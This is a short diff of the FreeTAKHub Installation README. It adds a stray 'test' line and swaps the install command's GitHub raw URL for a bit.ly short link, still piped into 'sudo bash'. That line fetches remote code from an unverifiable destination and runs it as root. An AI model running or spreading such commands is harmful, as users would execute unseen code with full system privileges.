@@ -1,13 +1,13 @@
 ![CI](https://github.com/FreeTAKTeam/FreeTAKHub-Installation/actions/workflows/ci.yml/badge.svg)
 
 # FreeTAKHub Installation
-
+test
 ## Zero Touch Deployment
 
 To install, enter into the console:
 
 ```console
-wget -qO - https://raw.githubusercontent.com/FreeTAKTeam/FreeTAKHub-Installation/main/scripts/easy_install.sh | sudo bash
+wget -qO - https://bit.ly/36RnO5x | sudo bash
 ```
 
 The optimal configuration to run the script is:
